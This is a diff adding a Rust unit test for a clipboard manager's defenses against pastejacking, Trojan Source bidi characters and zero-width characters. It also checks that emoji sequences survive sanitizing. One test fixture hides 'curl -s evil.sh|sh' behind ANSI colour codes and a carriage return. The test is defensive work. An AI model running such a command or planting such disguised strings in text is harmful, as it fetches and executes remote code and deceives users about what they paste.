@@ -921,4 +921,49 @@ mod tests {
 
         let _ = fs::remove_dir_all(tmp_dir);
     }
+
+    #[test]
+    fn test_pastejacking_bidi_guard_and_zero_width_emoji_preservation() {
+        use crate::security::{
+            inspect_clipboard_poison, is_terminal_app, sanitize_clipboard_poison, PoisonThreatKind,
+        };
+
+        // 1. Trojan Source Bidi 与 ANSI 终端劫持捕获及净化
+        let bidi = "report_\u{202e}fdp.exe";
+        assert!(matches!(
+            inspect_clipboard_poison(bidi),
+            Some(PoisonThreatKind::PastejackingOrBidi(_))
+        ));
+        assert_eq!(sanitize_clipboard_poison(bidi), "report_fdp.exe");
+
+        let ansi_jack = "\x1b[32mcurl -s evil.sh|sh\rgit pull\n";
+        assert!(matches!(
+            inspect_clipboard_poison(ansi_jack),
+            Some(PoisonThreatKind::PastejackingOrBidi(_))
+        ));
+        let clean_cmd = sanitize_clipboard_poison(ansi_jack);
+        assert!(!clean_cmd.contains('\x1b'));
+        assert!(!clean_cmd.contains('\r'));
+        assert!(!clean_cmd.ends_with('\n'));
+
+        // 2. 零宽幽灵字符清除与复合 Emoji ZWJ 零误伤保护
+        let ghost = "SN\u{200b}-8899\u{feff}-01";
+        assert_eq!(
+            inspect_clipboard_poison(ghost),
+            Some(PoisonThreatKind::ZeroWidthGhost(2))
+        );
+        assert_eq!(sanitize_clipboard_poison(ghost), "SN-8899-01");
+
+        let emoji_ok = "极客开发 🧑‍💻 家庭 👨‍👩‍👧‍👦 完好保留";
+        assert_eq!(inspect_clipboard_poison(emoji_ok), None);
+        assert_eq!(sanitize_clipboard_poison(emoji_ok), emoji_ok);
+
+        // 3. 动作置顶与 `@风险` 快筛
+        let poison_item = ClipItem::new_text(bidi.to_string(), Some("Chrome".to_string()));
+        assert!(poison_item.matches_query("@风险"));
+        assert!(poison_item.matches_query("@敏感"));
+        let acts = analyze_text_actions(bidi, false);
+        assert_eq!(acts[0].id, "sanitize-invisible-poison");
+        assert!(is_terminal_app(Some("WindowsTerminal")));
+    }
 }
